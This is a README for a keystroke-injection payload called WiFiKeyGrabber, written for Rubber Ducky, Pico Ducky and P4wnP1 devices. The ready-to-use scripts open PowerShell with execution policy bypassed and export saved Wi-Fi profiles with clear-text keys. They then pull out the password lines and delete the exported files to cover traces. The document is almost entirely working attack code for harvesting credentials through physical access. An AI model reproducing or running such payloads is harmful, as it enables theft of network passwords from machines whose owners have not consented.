# Credentials - WiFiKeyGrabber

## Description

WiFiKeyGrabber is a simple HIDScript that show in powershell output the saved Wi-Fi Passwords.

## Requirement

1. First note this script has been created and tested under Windows 11 Build 22000.
2. I used a QWERTZ keyboard to do this ("ch" layout), so you may need to change that.

## Code Rubber/Pico Ducky

```bash
DEFAULT_DELAY 1000
GUI r
DELAY 200
STRING powershell.exe -nop -exec bypass
ENTER
DELAY 200
STRING netsh wlan export profile key=clear
ENTER
DELAY 200
STRING Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' | Select Filename, LineNumber, Line, Path | Format-Table
ENTER
DELAY 200
STRING del Wi-Fi*.xml
ENTER
```

## Code P4wnP1 Version

```bash
layout("ch")
press("GUI r")
delay(200)
type("powershell.exe -nop -exec bypass")
press("ENTER")
delay(1000)
type("netsh wlan export profile key=clear")
press("ENTER")
type("Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' | Select Filename, LineNumber, Line, Path | Format-Table")
press("ENTER")
type("del Wi-Fi*.xml")
press("ENTER")
```

